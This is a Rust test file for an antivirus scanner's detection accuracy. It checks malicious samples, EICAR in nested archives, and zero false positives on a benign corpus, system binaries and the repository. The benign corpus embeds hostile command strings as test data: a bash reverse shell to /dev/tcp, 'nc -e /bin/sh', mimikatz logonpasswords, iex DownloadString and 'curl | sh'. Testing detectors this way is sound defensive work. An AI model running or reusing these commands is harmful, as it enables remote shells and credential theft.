//! Detection accuracy: every malicious and suspicious sample is caught with
//! the expected threat name, bare and inside archives, and a deliberately
//! adversarial benign corpus, system binaries, the platform's Python standard
//! library (when present) and this repository all scan clean. Was
//! tests/test_detection_accuracy.py, which drove the Python engine directly.
//!
//! Set GUARD_FP_FULL=1 to sweep every system file instead of a sample.

mod common;

use std::path::{Path, PathBuf};

use common::fixtures::*;
use common::samples::{self, eicar};
use common::*;
use serde_json::Value;

/// Removes "|~|" split markers at runtime, so this source never holds the
/// contiguous strings the rules hunt for.
fn u(b: &[u8]) -> Vec<u8> {
    String::from_utf8_lossy(b).replace("|~|", "").into_bytes()
}

fn blob() -> String {
    format!("iVBORw0KGgo{}", "A".repeat(4000))
}

fn benign() -> Vec<(&'static str, Vec<u8>)> {
    let blob = blob();
    vec![
        ("SECURITY.md", u(b"Never run `bash -i >& /dev/|~|tcp/10.0.0.1/4444 0>&1` from untrusted docs.\nAttackers also use `nc -e /bin/|~|sh` and mimi|~|katz sekurlsa::|~|logonpasswords.\n")),
        ("install-choco.ps1", u(b"Set-Execution|~|Policy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = 3072; i|~|ex ((New-Object System.Net.Web|~|Client).Download|~|String('https://community.chocolatey.org/install.ps1'))\n")),
        ("deploy.ps1", u(b"powershell.exe -No|~|Profile -Execution|~|Policy Bypass -File .\\build.ps1\nInvoke-WebRequest -Uri $url -OutFile pkg.zip\n")),
        ("bundle.js", format!("/******/ (() => {{ var __webpack_modules__ = ({{\n\"./src/index.js\": (() => {{ eval(\"console.log('hi')//# sourceURL=webpack://app/./src/index.js\"); }})\n}}); const logo = 'data:image/png;base64,{blob}'; }})();\n").into_bytes()),
        ("search.php", b"<?php\n$q = isset($_GET['q']) ? htmlspecialchars($_GET['q']) : '';\necho \"<p>You searched for $q</p>\";\n$out = exec('uptime');\n".to_vec()),
        ("client.py", b"import socket\ns = socket.socket()\ns.connect(('example.org', 80))\ns.sendall(b'GET / HTTP/1.0\\r\\n\\r\\n')\nprint(s.recv(1024))\n".to_vec()),
        ("plugin_loader.py", b"import base64\ncode = compile(open('plugin.py').read(), 'plugin.py', 'exec')\nexec(code)\nicon = base64.b64decode(ICON)\n".to_vec()),
        ("package.json", b"{\"name\": \"app\", \"version\": \"1.0.0\", \"scripts\": {\"postinstall\": \"node scripts/setup.js\", \"build\": \"curl -fsSL https://example.org/schema.json -o schema.json\"}, \"dependencies\": {\"left-pad\": \"1.3.0\"}}\n".to_vec()),
        ("DONATE.md", b"Support us: bitcoin bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq. Thanks!\n".to_vec()),
        ("crypto_notes.txt", b"Files are encrypted at rest with AES-256. To decrypt, use the KMS key.\n".to_vec()),
        ("mining-docs.rst", u(b"Point your miner at stratum+|~|tcp://pool.example.org:3333 (xm|~|rig works).\n")),
        ("av_research.py", u(b"KNOWN_TOOLS = ['mimi|~|katz']\n")),
        ("macros.bas", b"Sub Document_Open()\n  MsgBox \"Welcome\"\nEnd Sub\n".to_vec()),
        ("report.final.pdf", b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n".to_vec()),
        (
            "setup.exe",
            build_pe_with(
                &[section(b".text", EXEC | READ | CODE, vec![0x90; 512]), section(b".data", READ | WRITE, vec![0; 512])],
                0x1000,
                b"IsDebuggerPresent\0GetProcAddress\0LoadLibraryA\0",
                0x10B,
                false,
            ),
        ),
        ("libfoo.so", build_elf(&[vec![0u8; 2048], b"GLIBC_2.17\0".to_vec()].concat())),
        (
            "photos.zip",
            make_zip(&[("a.jpg", &[b"\xff\xd8\xff\xe0".as_slice(), &random_bytes(2000, 1)].concat()), ("notes.txt", b"trip")], &[]),
        ),
        ("src.tar.gz", gz(&make_tar(&[("main.c", b"int main(void){return 0;}\n"), ("Makefile", b"all:\n\tcc main.c\n")]))),
        ("log.gz", gz(&b"INFO started\n".repeat(100))),
        ("minified.js", format!("!function(e,t){{var n={}}}(window,document);\n", "a.b(c,d);".repeat(2000)).into_bytes()),
        ("styles.css", format!(".logo{{background:url(data:image/svg+xml;base64,{blob})}}\n").into_bytes()),
        // high entropy but not an executable
        ("random.bin", random_bytes(65536, 2)),
        ("font.woff2", [b"wOF2".as_slice(), &random_bytes(5000, 3)].concat()),
        ("Dockerfile", b"FROM alpine\nRUN apk add --no-cache curl && curl -fsSL https://get.example.org | sh\n".to_vec()),
        ("rev.sh.txt", u(b"# example: bash -i >& /dev/|~|tcp/1.2.3.4/80 0>&1\n")),
        (
            "dll.dll",
            build_pe_with(
                &[
                    section(b".text", EXEC | READ | CODE, vec![0xc3; 4096]),
                    section(b".rdata", READ, b"strings\0".repeat(64)),
                    section(b".data", READ | WRITE, vec![0; 512]),
                ],
                0x1000,
                b"",
                0x10B,
                true,
            ),
        ),
    ]
}

/// `guard av scan --json` over `paths`: file name -> result object.
fn scan(tmp: &Tmp, paths: &[PathBuf]) -> Vec<(String, Value)> {
    let mut out = Vec::new();
    // in batches, under Windows' command-line limit
    for chunk in paths.chunks(150) {
        let mut args = vec!["av".to_string(), "scan".into(), "--json".into()];
        args.extend(chunk.iter().map(|p| s(p)));
        let r = guard(&args).home(&tmp.join("home")).run();
        assert!(r.code == 0 || r.code == 1, "{}", r.stderr);
        let start = r
            .stdout
            .find('{')
            .unwrap_or_else(|| panic!("no report: {}", r.stdout));
        for res in parse_json(&r.stdout[start..])["results"]
            .as_array()
            .unwrap()
        {
            out.push((res["path"].as_str().unwrap().to_string(), res.clone()));
        }
    }
    out
}

fn by_name(results: &[(String, Value)], name: &str) -> Value {
    results
        .iter()
        .find(|(p, _)| Path::new(p).file_name().is_some_and(|f| f == name))
        .unwrap_or_else(|| panic!("{name} not in the report"))
        .1
        .clone()
}

fn summary(v: &Value) -> String {
    format!("{} {} {}", v["verdict"], v["threat"], v["detections"])
}

#[test]
fn malicious_and_suspicious_corpus() {
    for (table, verdict) in [
        (samples::MALICIOUS, "malicious"),
        (samples::SUSPICIOUS, "suspicious"),
    ] {
        let tmp = Tmp::new("corpus");
        let files: Vec<_> = samples::decoded(table)
            .into_iter()
            .map(|(n, t, d)| (write(&tmp.join("c").join(n), d), n, t))
            .collect();
        let res = scan(&tmp, &[tmp.join("c")]);
        for (_, name, threat) in files {
            let r = by_name(&res, name);
            assert_eq!(
                (r["verdict"].as_str(), r["threat"].as_str()),
                (Some(verdict), Some(threat)),
                "{name}: {}",
                summary(&r)
            );
        }
    }
}

#[test]
fn malicious_corpus_inside_archives() {
    let tmp = Tmp::new("archives");
    let mut names = Vec::new();
    for (name, _, data) in samples::decoded(samples::MALICIOUS) {
        let d = tmp.join("a");
        let inner = format!("x/{name}");
        write(
            &d.join(format!("{name}.zip.archive")),
            make_zip(&[(inner.as_str(), &data)], &[]),
        );
        write(
            &d.join(format!("{name}.tgz.archive")),
            gz(&make_tar(&[(name, &data)])),
        );
        write(&d.join(format!("{name}.gz")), gz(&data));
        write(
            &d.join(format!("{name}.nested.archive")),
            make_zip(&[("inner.zip", &make_zip(&[(name, &data)], &[]))], &[]),
        );
        names.extend([
            format!("{name}.zip.archive"),
            format!("{name}.tgz.archive"),
            format!("{name}.gz"),
            format!("{name}.nested.archive"),
        ]);
    }
    let res = scan(&tmp, &[tmp.join("a")]);
    for n in names {
        let r = by_name(&res, &n);
        assert_eq!(r["verdict"], "malicious", "{n}: {}", summary(&r));
    }
}

#[test]
fn eicar_everywhere() {
    let tmp = Tmp::new("eicar");
    let e = eicar();
    let d = tmp.join("e");
    write(&d.join("eicar.com"), &e);
    write(&d.join("eicar.zip"), make_zip(&[("eicar.com", &e)], &[]));
    write(
        &d.join("eicar2.zip"),
        make_zip(&[("z.zip", &make_zip(&[("eicar.com", &e)], &[]))], &[]),
    );
    let res = scan(&tmp, &[d]);
    for n in ["eicar.com", "eicar.zip", "eicar2.zip"] {
        assert_eq!(by_name(&res, n)["threat"], "EICAR-Test-File", "{n}");
    }
}

#[test]
fn benign_corpus_is_clean() {
    let tmp = Tmp::new("benign");
    let corpus = benign();
    for (n, data) in &corpus {
        write(&tmp.join("b").join(n), data);
    }
    // the report lists only what was flagged
    let flagged: Vec<String> = scan(&tmp, &[tmp.join("b")])
        .iter()
        .map(|(p, r)| format!("{p}: {}", summary(r)))
        .collect();
    assert!(
        flagged.is_empty(),
        "false positives:\n{}",
        flagged.join("\n")
    );
}

const SKIP: &[&str] = &[
    ".git",
    "testdata",
    "target",
    "__pycache__",
    ".pytest_cache",
    "node_modules",
    ".venv",
];

/// Up to `limit` regular files under `roots`, in a stable order.
fn files(roots: &[PathBuf], limit: Option<usize>) -> Vec<PathBuf> {
    fn walk(d: &Path, out: &mut Vec<PathBuf>, limit: usize) {
        let Ok(rd) = std::fs::read_dir(d) else { return };
        let mut entries: Vec<_> = rd.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            if out.len() >= limit {
                return;
            }
            let Ok(ft) = e.file_type() else { continue };
            let name = e.file_name().to_string_lossy().into_owned();
            if ft.is_dir() && !SKIP.contains(&name.as_str()) {
                walk(&e.path(), out, limit);
            } else if ft.is_file() {
                out.push(e.path());
            }
        }
    }
    let mut out = Vec::new();
    for r in roots {
        walk(r, &mut out, limit.unwrap_or(usize::MAX));
    }
    out
}

fn full() -> bool {
    std::env::var_os("GUARD_FP_FULL").is_some_and(|v| v == "1")
}

fn assert_clean(tag: &str, paths: &[PathBuf]) {
    let tmp = Tmp::new(tag);
    let flagged: Vec<String> = scan(&tmp, paths)
        .into_iter()
        .filter(|(_, r)| r["verdict"] != "clean")
        .map(|(p, r)| format!("{p}: {}", r["threat"]))
        .collect();
    assert!(
        flagged.is_empty(),
        "false positives:\n{}",
        flagged.join("\n")
    );
}

#[test]
fn zero_false_positives_on_system_binaries() {
    let roots: Vec<PathBuf> = if WINDOWS {
        let sys = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
        vec![Path::new(&sys).join("System32")]
    } else {
        vec!["/usr/bin".into(), "/usr/sbin".into()]
    };
    // System32 holds a few thousand top-level files; sample them
    let paths = files(&roots, if full() { None } else { Some(300) });
    assert_clean("fp-system", &paths);
}

#[test]
fn zero_false_positives_on_python_stdlib() {
    // a large body of real-world source with eval/exec/socket/base64 use
    let Some(stdlib) = ["/usr/lib", "/usr/local/lib", "/opt/homebrew/lib"]
        .iter()
        .filter_map(|d| std::fs::read_dir(d).ok())
        .flat_map(|rd| rd.flatten().map(|e| e.path()))
        .filter(|p| {
            p.file_name()
                .is_some_and(|n| n.to_string_lossy().starts_with("python3"))
                && p.join("os.py").is_file()
        })
        .min()
    else {
        eprintln!("skipped: no Python standard library on this machine");
        return;
    };
    let paths = files(&[stdlib], if full() { None } else { Some(1500) });
    assert!(paths.len() >= 500);
    assert_clean("fp-stdlib", &paths);
}

/// Guard's own source, docs, installers, tests and signature DBs, and the
/// binary under test, must scan clean (testdata/ holds the intentionally
/// infected incident fixtures).
#[test]
fn zero_false_positives_on_this_repository() {
    let mut paths = files(&[repo_root()], None);
    assert!(paths.len() > 50);
    paths.push(bin());
    assert_clean("fp-repo", &paths);
}
